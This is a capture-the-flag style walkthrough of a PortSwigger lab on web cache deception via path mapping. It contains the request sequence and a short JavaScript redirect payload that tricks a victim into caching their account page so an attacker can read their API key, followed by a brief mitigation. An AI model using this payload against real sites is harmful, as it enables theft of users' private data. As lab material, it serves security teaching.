# Lab 01 — Exploiting path mapping for web cache deception

> **Practitioner** · [Official lab](https://portswigger.net/web-security/web-cache-deception/lab-wcd-exploiting-path-mapping)

**Entry point:** the origin **abstracts** the path (`/my-account/anything`
still serves `/my-account`), and the cache caches `.js` URLs.

## Solution

1. Confirm mapping: `GET /my-account/abc` → 200 with your API key.
2. Add a static extension: `GET /my-account/abc.js` → `X-Cache: miss`, then
   **hit** within the 30s `max-age`.
3. Craft the victim-navigation exploit:

```html
<script>document.location="https://YOUR-LAB-ID.web-security-academy.net/my-account/wcd.js"</script>
```

(use a fresh segment so the victim doesn't get your cached copy).

4. Deliver to victim — their account page (with API key) is cached under
   `/my-account/wcd.js`. Request the same URL — carlos's API key —
   submit it — lab solved.

## Mitigation

Cache only by explicit markers, not extension rules; treat
`/my-account/*` as private.
